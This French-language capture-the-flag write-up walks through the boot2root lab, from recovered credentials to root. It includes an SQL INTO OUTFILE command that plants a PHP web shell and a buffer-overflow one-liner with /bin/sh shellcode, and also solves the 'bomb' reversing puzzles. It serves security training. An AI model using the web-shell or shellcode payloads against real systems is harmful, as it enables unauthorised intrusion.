# Write Up 1

## Password
| Service    | User                 | Passwd                                                             |
|------------|----------------------|--------------------------------------------------------------------|
| serv       | user                 | `pass`                                                             | 
| Forum      | lmezard              | `!q\]Ej?*5K5cy*AJ`                                                 | 
| Mail       | laurie@boot2root.htb | `!q\]Ej?*5K5cy*AJ`                                                 | 
| PhpMyAdmin | root                 | `Fg-'kKXBj87E:aJ$`                                                 | 
| FTP        | lmezard              | `G!@M6f4Eatau{sF"`                                                 | 
| SSH        | laurie               | `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` | 
| SSH        | thor                 | `Publicspeakingisveryeasy.126241207201b2149opekmq426135`           | 
| SSH        | zaz                  | `646da671ca01bb5d84dbb5fb2238dc8e`                                 | 

## Forum
- Nous recuperons les [logs du ssh](https://boot2root.htb/forum/index.php?id=6) sur le forum 
- `python3 ssh_parse.py`
<pre>
{'test', 'support', 'naos', 'lmezard', 'guest', 'nagios', 'ubnt', 'root', <strong>'!q\\]Ej?*5K5cy*AJ'</strong>, 'ftpuser', 'PlcmSpIp', 'adm', 'user', 'adam', 'nvdb', 'admin', 'pi'}
</pre>
- On a maintenant un mot de passe 
- On peut donc se connecter avec les login `lmezard` et `!q\]Ej?*5K5cy*AJ` sur le forum
- Le mail est disponible dans les parametres de l'user

## Mail
- On se connecte au server imap avec `laurie@boot2root.htb` et `!q\]Ej?*5K5cy*AJ` avec evolution ou sur le site [webmail](https://boot2root.htb/webmail/)
- Un mail est disponible
<pre>
Hey Laurie,

You cant connect to the databases now. Use <strong>root/Fg-'kKXBj87E:aJ$</strong>

Best regards.
</pre>

## PhpMyAdmin
- Nous pouvons donc se connecter sur le [PhpMyAdmin](https://boot2root.htb/phpmyadmin/).
<!-- - En changant le password de admin par celui de lmezard on peut se connecter en tant qu'admin sur le forum -->
- On essaye maintenant d'inserer un code php dans le serveur web pour qu'il soit executer
- En executant cette commande sql je peux ecrire dans un fichier.
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
```
- En regardant le forum type sur [github](https://github.com/ilosuna/mylittleforum) et en testant tout les dossier un est accessible a l'ecriture `/var/www/forum/templates_c`
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/cmd.php"
```
- Dans les home un dossier est present LOOKATME qui contient un dossier password
<pre>
$ ls /home
LOOKATME
ft_root
laurie
laurie@borntosec.net
lmezard
thor
zaz
$ ls /home/LOOKATME
password
$ cat /home/LOOKATME/password
<strong>lmezard:G!@M6f4Eatau{sF"</strong>
</pre>

## Lmezard FTP
- On peut se [connecter au FTP](ftp://lmezard:G!@M6f4Eatau{sF"@boot2root.htb) grace a ce login (sur filezilla )
- On recupere les fichiers
- README:
```
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```
- On remarque que le fichier fun est une archive de plusieurs fichiers, on le decompresse donc avec `tar -xf fun`
```
$> file fun 
fun: POSIX tar archive (GNU)
```
- On remarque que le contenu des fichiers est un code en C en plusieurs partie
- Nous avons donc créé un script python qui recupére tout les fichiers et les mets dans l'ordre.

```
$> python fun.py "../Ressources/ft_fun" > fun.c
$> gcc fun.c 
$> ./a.out 
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit% 
```

- On se connecte maintenant en SSH avec laurie en login et **330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4** en mot de passe.

```
ssh laurie@boot2root.htb
```

## Laurie
```
scp laurie@boot2root.htb:/home/laurie/bomb .
```

- Un fichier README se trouve dans le home de laurie: 
```
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```
- Un executable bomb est aussi present.
- Nous le decompilons avec binary ninja et commencons à le resoudre

### Phase 1:
- Depuis binary ninja, nous voyons qu'une string est comparer: `Public speaking is very easy.`
- Il suffit de l'entre dans le programme

### Phase 2:
- Voici le code de la phase 2
```C
int32_t phase_2(int32_t arg1) {
  int listNumber[6];

  read_six_numbers(arg1, listNumber)
  if (*listNumber != 1)
      explode_bomb()
      noreturn
  int32_t index = 1
  int32_t result = 1
  do
      result = (index + 1) * result
      if (listNumber[index] != result)
          explode_bomb()
          exit
      index = index + 1
  while (index s<= 5)
  return result
}
```
pour n >= 1
U<sub>0</sub> = 1
U<sub>n+1</sub> = U<sub>n</sub> * (n + 1)

- On comprends donc que la suite de chiffre donne `1 2 6 24 120 720`


### Phase 3 
- Dans binary ninja on voit qu'il y a trois argument "%d %c %d"
- Dans le code il suffit de lire les conditions
- Le premier chiffre determine les deux argument d'apres dans les case
- L'indice nous disait que le second argument etait `b`
- Le case 1 possede `b` 
```
case 1:
		ebx.b = 'b' // le char
		if (var_8 !=  214) // le int de fin
				explode_bomb()
				noreturn;
```
- Se qui donne:
```
1 b 214
```

### Phase 4
- L'entrée est un nombre. Il est passer en paramatre de la fonction `func4` celle ci dois retourner a `55 (0x37)`.
- Nous avons recoder `func4`
- LE SCRIPTTTT !

### Phase 5
La string est encoder en fonction de sa representation ascii, a l'aide du dictionnaire "isrveawhobpnutfg". On recode cette fonction en on la bruteforce grace a notre script.
- Script `gcc phase5/phase5_solver.c && ./a.out`
- Ce qui donne:

| g | i | a | n | t | s |
|:-:|:-:|:-:|:-:|:-:|:-:|
| o | p | e | k | m | q |

### Phase 6
- On sait grace au code qu'il ne faut que:
  - Les chiffres ne soit pas en double
  - Les chiffre doivent etre entre 0 et 6
  - que le premier est egale a 4
- avec ces informations on a crée un script qui teste les 775 possibilités
- Ce qui donne:
```
4 2 6 3 1 5
```

### Secret Phase
- On peut rentrer dans la secret a condition qu'une string soit egale a "austinpowers"
- Quand on regarde la string qui est sscanf elle est egale a "9"
- On comprend donc que c'est la string de phase 4 qui est analysé on rajoute donc " austinpowers" a la fin

### Password
- Le tout donne:
```
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekmq
4 2 6 3 1 5
```
- Ce qui donne en inversant les dernier caracteres:
```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

## Turtle
- Il y a un fichier avec des instructions
- En l'interpretant avec un script javascript, on voit que les instructions ecrivent: SLASH
- En le convertissant en md5 nous obtenons le mot de passe de zaz
- Ce qui donne:
```
646da671ca01bb5d84dbb5fb2238dc8e
```

## Zaz & Root
- On voit qu'il y a un strcpy de argv[1], le programme peut donc être overflow
<pre>
$> ltrace ./exploit_me testt
__libc_start_main(0x80483f4, 2, 0xbffff704, 0x8048440, 0x80484b0 <unfinished ...>
strcpy(0xbffff5e0, "testt")                                            = 0xbffff5e0
puts("testt"testt)                                                     = 6
+++ exited (status 0) +++
</pre>
- On calcule l'offset
<pre>
zaz@BornToSecHackMe:~$ gdb ./exploit_me 
(gdb) source /tmp/peda/peda.py 
gdb-peda$ pattern arg 200
Set 1 arguments to program
gdb-peda$ r
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xb7fd0ff4 --> 0x1a4d7c
ECX: 0xffffffff
EDX: 0xb7fd28b8 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x41514141 ('AAQA')
ESP: 0xbffff640 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41416d41 ('AmAA')
EFLAGS: 0x210286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41416d41
[------------------------------------stack-------------------------------------]
0000| <strong>0xbffff640</strong> ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| 0xbffff644 ("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xbffff648 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| 0xbffff64c ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0xbffff650 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xbffff654 ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0xbffff658 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| 0xbffff65c ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41416d41 in ?? ()
gdb-peda$  pattern offset AmAA
AmAA found at offset: <strong>140</strong>
</pre>

- Ce qui donne
```
cat | ./exploit_me $(python -c "import struct; print('\x90' * (100) + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (140 - 121) + struct.pack('<I', 0xbffff640))")
```
